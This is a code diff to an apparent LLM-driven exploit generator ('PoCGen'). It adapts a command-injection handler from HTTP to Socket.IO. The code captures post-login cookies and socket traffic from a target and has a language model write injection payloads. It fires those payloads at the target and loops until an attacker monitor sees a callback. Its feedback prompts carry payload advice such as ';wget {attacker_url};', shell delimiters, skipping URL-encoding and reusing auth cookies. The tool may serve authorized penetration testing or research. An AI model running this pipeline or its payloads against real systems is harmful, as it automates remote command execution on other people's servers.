@@ -9,9 +9,10 @@ from rich.console import Console
 
 from PoCGen.config.config import SETTINGS
 from PoCGen.llm.client import ChatMessage, LLMClient
-from PoCGen.prompts.templates import build_prompt_command_injection_http
+from PoCGen.prompts.templates import build_prompt_command_injection_socket
 from PoCGen.core.sampler import sample_target_with_playwright
 from PoCGen.core.target_profile import TargetSample
+from PoCGen.tools.getWeb import get_web_infomation
 from PoCGen.core.attacker_monitor import (
     AttackerMonitor,
     get_monitor_base_url,
@@ -19,23 +20,23 @@ from PoCGen.core.attacker_monitor import (
     reset_external_monitor,
     wait_for_external_monitor,
 )
-from PoCGen.tools.getWeb import get_web_infomation
 from PoCGen.core.models import (
     AttemptResult,
     GenerationResult,
     HTTPMessage,
+    SocketEventMessage,
     ValidationResult,
     VulnHandler,
 )
-from .postprocess import save_messages, split_messages
+from .postprocess import split_socket_messages, save_socket_messages
 from .validators import parse_and_validate
-from .remote_validator import validate_http_requests
+from .remote_validator import validate_socket_events
 
 console = Console()
 
 
-class CommandInjectionHTTPHandler(VulnHandler):
-    name = "command_injection_http"
+class CommandInjectionSocketHandler(VulnHandler):
+    name = "command_injection_socket"
 
     def build_messages(
         self,
@@ -46,7 +47,7 @@ class CommandInjectionHTTPHandler(VulnHandler):
         target_profile: Optional[str] = None,
         validation_feedback: Optional[str] = None,
     ) -> List[dict]:
-        msgs = build_prompt_command_injection_http(
+        msgs = build_prompt_command_injection_socket(
             description=description,
             code_files=code_texts,
             target=target,
@@ -57,7 +58,7 @@ class CommandInjectionHTTPHandler(VulnHandler):
         return [m.model_dump() for m in msgs]
 
 
-def generate_command_injection_http(
+def generate_command_injection_socket(
     description: str,
     code_texts: List[str],
     target: Optional[str] = None,
@@ -79,8 +80,8 @@ def generate_command_injection_http(
     use_browser_login: bool = False,
     browser_headless: Optional[bool] = None,
 ) -> GenerationResult:
-    handler_key = vuln_type or CommandInjectionHTTPHandler.name
-    handler = CommandInjectionHTTPHandler()
+    handler_key = vuln_type or CommandInjectionSocketHandler.name
+    handler = CommandInjectionSocketHandler()
     atk_url = attacker_url or SETTINGS.attacker_url
     if cvenumber:
         get_web_infomation(cvenumber)
@@ -110,26 +111,29 @@ def generate_command_injection_http(
         max_iters = 1
     stop_after_success = SETTINGS.stop_on_success if stop_on_success is None else stop_on_success
     monitor_wait = monitor_timeout or SETTINGS.monitor_timeout
-    out_dir = SETTINGS.save_dir
+    out_dir = SETTINGS.socket_save_dir
     attempts: List[AttemptResult] = []
     feedback_text: Optional[str] = None
     overall_success = False
     last_raw_output = ""
-    last_requests: List[HTTPMessage] = []
+    last_events: List[SocketEventMessage] = []
     last_saved_paths: List[str] = []
     last_validation_results: Optional[List[ValidationResult]] = None
 
     monitor: Optional[AttackerMonitor] = None
     external_monitor_url: Optional[str] = None
     monitor_base_url = get_monitor_base_url()
-    conversation_messages: List[ChatMessage] = [ChatMessage(**m) for m in handler.build_messages(
-        description,
-        code_texts,
-        target,
-        atk_url,
-        None,
-        None,
-    )]
+    conversation_messages: List[ChatMessage] = [
+        ChatMessage(**m)
+        for m in handler.build_messages(
+            description,
+            code_texts,
+            target,
+            atk_url,
+            None,
+            None,
+        )
+    ]
     monitor_running = False
     if auto_validate:
         if monitor_available(monitor_base_url):
@@ -150,7 +154,6 @@ def generate_command_injection_http(
 
     try:
         target_profile_block: Optional[str] = None
-        sample_cookies_header: Optional[str] = None
         if probe_target and target:
             if use_browser_login:
                 try:
@@ -162,16 +165,19 @@ def generate_command_injection_http(
                         login_user_field=login_user_field,
                         login_pass_field=login_pass_field,
                         headless=browser_headless,
-                        capture_posts=True,
+                        capture_posts=False,
                         capture_cookies=True,
-                        capture_socket_messages=False,
+                        capture_socket_messages=True,
                     )
-                    target_profile_block = sample.as_prompt_block()
-                    sample_cookies_header = sample.cookies_header
+                    target_profile_block = _format_socket_sample_prompt(sample)
+                    if target_profile_block:
+                        console.print("[cyan]Captured socket traffic sample for prompt context")
+                    else:
+                        console.print("[yellow]Socket sampling completed but no frames were recorded")
                 except Exception as exc:
-                    console.print(f"[yellow]Warning: failed to probe target {target}: {exc}")
+                    console.print(f"[yellow]Warning: failed to capture socket sample from {target}: {exc}")
             else:
-                console.print("[yellow]probe_target currently requires --browser-login; skipping target sampling")
+                console.print("[yellow]probe_target currently requires --browser-login; skipping socket sampling")
 
         for attempt_index in range(max_iters):
             console.print(f"\n[bold]Attempt {attempt_index + 1}/{max_iters}[/bold]")
@@ -182,7 +188,7 @@ def generate_command_injection_http(
 
             messages: List[ChatMessage] = list(conversation_messages)
             if target_profile_block:
-                messages.append(ChatMessage(role="user", content=f"Updated target profile:\n{target_profile_block}"))
+                messages.append(ChatMessage(role="user", content=f"Captured socket sample:\n{target_profile_block}"))
             if feedback_text:
                 messages.append(ChatMessage(role="user", content=f"Feedback from previous attempt:\n{feedback_text}"))
 
@@ -200,65 +206,58 @@ def generate_command_injection_http(
             conversation_messages.append(ChatMessage(role="assistant", content=raw_output))
             log_chat("Model output:\n" + raw_output)
 
-            raw_messages = split_messages(raw_output)
+            raw_messages = split_socket_messages(raw_output)
             if not raw_messages and raw_output.strip():
                 raw_messages = [raw_output.strip()]
 
             if raw_messages:
-                saved_paths = save_messages(raw_messages, out_dir)
+                saved_paths = save_socket_messages(raw_messages, out_dir)
                 console.print(
-                    f"Saved {len(saved_paths)} PoC request(s) to: {out_dir}"
+                    f"Saved {len(saved_paths)} socket PoC request(s) to: {out_dir}"
                 )
             else:
                 saved_paths = []
                 console.print(
-                    f"[yellow]Attempt {attempt_index + 1} produced no parseable HTTP request"
+                    f"[yellow]Attempt {attempt_index + 1} produced no parseable socket payload"
                 )
 
-            requests: List[HTTPMessage] = []
+            socket_events: List[SocketEventMessage] = []
             parse_issues: List[str] = []
             for idx, raw in enumerate(raw_messages):
                 try:
                     msg, errs = parse_and_validate(raw)
-                    requests.append(msg)
-                    if errs:
-                        for err in errs:
-                            parse_issues.append(f"Request #{idx}: {err}")
+                    socket_events.append(msg)
+                    parse_issues.extend(f"Event #{idx}: {err}" for err in errs)
                 except Exception as exc:
-                    parse_issues.append(f"Request #{idx} parse error: {exc}")
-                    requests.append(HTTPMessage(method="", path="", version="", headers={}, body=raw))
+                    parse_issues.append(f"Event #{idx} parse error: {exc}")
 
             validation_results: Optional[List[ValidationResult]] = None
             validation_error: Optional[str] = None
-            if auto_validate and target and requests:
-                if sample_cookies_header:
-                    for req in requests:
-                        if "Cookie" not in req.headers:
-                            req.headers["Cookie"] = sample_cookies_header
+            if auto_validate and socket_events:
                 try:
-                    validation_results = validate_http_requests(requests, target)
+                    validation_results = validate_socket_events(socket_events, target)
                     for res in validation_results:
                         if res.success:
                             console.print(
-                                f"[green]Request #{res.request_index} -> HTTP {res.status_code} ({res.url})"
+                                f"[green]Event #{res.request_index} dispatched successfully ({res.url})"
                             )
                         else:
-                            detail = res.error or (f"HTTP {res.status_code}" if res.status_code else "no response")
+                            detail = res.error or "no response"
                             preview = (res.response_preview or "").strip()
                             if preview:
                                 preview = preview[:200] + ("..." if len(preview) > 200 else "")
-                                detail += f" | body: {preview}"
+                                detail += f" | {preview}"
                             console.print(
-                                f"[yellow]Request #{res.request_index} validation failed ({detail})"
+                                f"[yellow]Event #{res.request_index} validation failed ({detail})"
                             )
                 except Exception as exc:
-                    console.print(f"[yellow]Warning: validation failed: {exc}")
+                    console.print(f"[yellow]Warning: socket validation failed: {exc}")
                     validation_results = None
                     validation_error = str(exc)
 
             monitor_hit = False
             monitor_summary: Optional[str] = None
-            if monitor_running and requests:
+            if monitor_running and socket_events:
                 if external_monitor_url:
                     monitor_hit, monitor_summary = wait_for_external_monitor(
                         external_monitor_url, monitor_wait, since_ts=generation_start_ts
@@ -278,7 +277,7 @@ def generate_command_injection_http(
 
             feedback_for_next = None
             if not monitor_hit:
-                feedback_for_next = _build_attempt_feedback(
+                feedback_for_next = _build_socket_attempt_feedback(
                     parse_issues,
                     validation_results,
                     atk_url,
@@ -290,17 +289,18 @@ def generate_command_injection_http(
                 AttemptResult(
                     attempt_index=attempt_index,
                     raw_output=raw_output,
-                    requests=requests,
+                    requests=[],
                     saved_paths=saved_paths,
                     validation_results=validation_results,
                     monitor_hit=monitor_hit,
                     monitor_summary=monitor_summary,
                     feedback=feedback_for_next,
+                    socket_events=socket_events,
                 )
             )
 
             last_raw_output = raw_output
-            last_requests = requests
+            last_events = socket_events
             last_saved_paths = saved_paths
             last_validation_results = validation_results
             overall_success = overall_success or monitor_hit
@@ -318,18 +318,36 @@ def generate_command_injection_http(
 
         return GenerationResult(
             raw_output=last_raw_output,
-            requests=last_requests,
+            requests=[],
             saved_paths=last_saved_paths,
             validation_results=last_validation_results,
             attempts=attempts,
             success=overall_success,
+            socket_events=last_events,
         )
     finally:
         if monitor:
             monitor.stop()
 
 
-def _build_attempt_feedback(
+def _format_socket_sample_prompt(sample: TargetSample) -> Optional[str]:
+    if not sample.socket_samples:
+        return None
+    block: List[str] = [
+        "Socket.IO sampling blueprint:",
+        f"Target URL: {sample.url}",
+    ]
+    if sample.cookies_header:
+        block.append(f"Cookie header (post-login): {sample.cookies_header}")
+    for idx, raw in enumerate(sample.socket_samples[:3], start=1):
+        snippet = raw.strip()
+        if len(snippet) > 1500:
+            snippet = snippet[:1500] + "\n... <truncated>"
+        block.append(f"Sample #{idx}:\n{snippet}")
+    return "\n\n".join(block)
+
+
+def _build_socket_attempt_feedback(
     parse_issues: List[str],
     validation_results: Optional[List[ValidationResult]],
     attacker_url: str,
@@ -339,38 +357,22 @@ def _build_attempt_feedback(
     messages: List[str] = []
     if parse_issues:
         bullet = "\n".join(f"- {issue}" for issue in parse_issues)
-        messages.append("Local HTTP parsing/validation issues detected:\n" + bullet)
+        messages.append("Socket payload parsing/validation issues detected:\n" + bullet)
 
     validation_summaries: List[str] = []
     failed_validation: List[ValidationResult] = []
     if validation_results is not None:
         for res in validation_results:
-            status = f"HTTP {res.status_code}" if res.status_code is not None else "no status"
-            url = res.url or "<no url>"
-            preview = (res.response_preview or "").strip()
-            if preview:
-                preview = preview[:200] + ("..." if len(preview) > 200 else "")
-            detail_parts: List[str] = []
-            if res.error:
-                detail_parts.append(res.error)
-            if preview:
-                detail_parts.append(f"body: {preview}")
-            detail = "; ".join(detail_parts)
-
-            if res.success:
-                line = f"Request #{res.request_index}: success -> {status} ({url})"
-            else:
-                failed_validation.append(res)
-                line = f"Request #{res.request_index}: failure -> {status} ({url})"
-                if not detail:
-                    detail = "no response"
+            status = "success" if res.success else "failure"
+            detail = res.error or (res.response_preview or "").strip() or "no response"
+            line = f"Event #{res.request_index}: {status} ({res.url})"
             if detail:
-                line += f"; {detail}"
+                line += f" -> {detail}"
             validation_summaries.append(line)
-
+            if not res.success:
+                failed_validation.append(res)
         if validation_summaries:
             messages.append("Target validation summary:\n" + "\n".join(f"- {item}" for item in validation_summaries))
-
     elif validation_error:
         messages.append(f"Target validation did not run due to error: {validation_error}")
     else:
@@ -378,8 +380,8 @@ def _build_attempt_feedback(
 
     if monitor_active:
         messages.append(
-            "Attacker monitor did NOT receive the expected wget callback. Ensure the payload executes wget "
-            f"{attacker_url} directly (no URL encoding of separators) and that the vulnerable parameter maps to command execution."
+            "Attacker monitor did NOT receive the expected wget callback. Ensure the Socket.IO payload executes wget "
+            f"{attacker_url} directly (no URL encoding of separators) and that the vulnerable argument is actually controllable."
         )
     else:
         messages.append(
@@ -389,11 +391,11 @@ def _build_attempt_feedback(
 
     if parse_issues or failed_validation:
         messages.append(
-            "Adjust along four tracks before the next attempt:\n"
-            "1) Encoding: rebuild the BODY to mirror required fields, parameter casing/order, and payload syntax; match the server's expected encoding (JSON vs form-urlencoded vs raw) and reuse its injection delimiters (e.g., '$(...)', '$(+ ...)', backticks, pipes).\n"
-            "2) Status/redirects: if 301/302, retry with the redirected path (e.g., '/path' -> '/path/'); if 401/403, refresh Cookie/credentials or follow the hinted auth flow; align Host/Origin/Referer with the target.\n"
-            "3) Method: if a POST with empty body fails, resend the same request as GET to handle endpoints that only read query params.\n"
-            "4) Payload: use a minimal, paired delimiter around the payload (e.g., ';wget {attacker_url};'), avoid extra quotes/backticks/brackets unless already present, and do NOT URL-encode separators; escape only what JSON requires."
+            "Before the next attempt, tighten the JSON structure and payload:\n"
+            "1) Schema: keep the keys exactly as requested (url, namespace, event, headers, cookies, wait_for_response, max_response_frames, payload).\n"
+            "2) Payload: mirror the server's expected object layout and wrap the injection with the delimiter style observed in code (e.g., ';wget {attacker_url};').\n"
+            "3) Endpoint: ensure the ws/wss URL, namespace, and event names match the code blueprint; reuse any authentication cookies or headers from the sample.\n"
+            "4) Responses: if redirects or auth failures occur, update cookies/headers accordingly and retry."
         )
 
     return "\n\n".join(messages) if messages else None
